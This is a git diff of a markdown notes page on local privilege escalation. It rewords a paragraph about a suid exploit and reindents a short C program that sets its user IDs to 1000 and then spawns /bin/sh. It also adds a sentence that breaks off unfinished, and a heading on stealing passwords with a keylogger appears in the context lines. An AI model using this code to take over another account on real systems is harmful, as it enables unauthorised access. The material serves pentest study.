@@ -385,7 +385,7 @@ int main()
 }
 ```
 
-Note that this type of exploit will not always work.  The above sets the uid, but upon actually executing the script, you may find that you still maintain the same privileges.  I believe that bash can drop permissions to what's known as the effective-uid to avoid suid vulnerabilities as above.  In this case, the best bet is to use the below code.
+Note that this type of exploit will not always work.  The above sets the uid, but upon actually executing the script, you may find that you still maintain the same privileges.  I believe that bash can drop permissions to what's known as the effective-uid to avoid suid vulnerabilities as above.  In this case, the best bet is to use the below code which just goes overboard.
 
 ```c
 #include <stdio.h>
@@ -394,14 +394,16 @@ Note that this type of exploit will not always work.  The above sets the uid, bu
 
 int main( int argc, char *argv[] )
 {
-	seteuid(1000);
-	setgid(1000);
-	setuid(1000);
-	setreuid(1000, 1000);
-	printf("ID: %d\n", geteuid());
-	execve("/bin/sh", NULL, NULL);
-}	
+    seteuid(1000);
+    setgid(1000);
+    setuid(1000);
+    setreuid(1000, 1000);
+    printf("ID: %d\n", geteuid());
+    execve("/bin/sh", NULL, NULL);
+}
 ```
+
+You could also just generate 
 
 ## Steal password through a keylogger
 
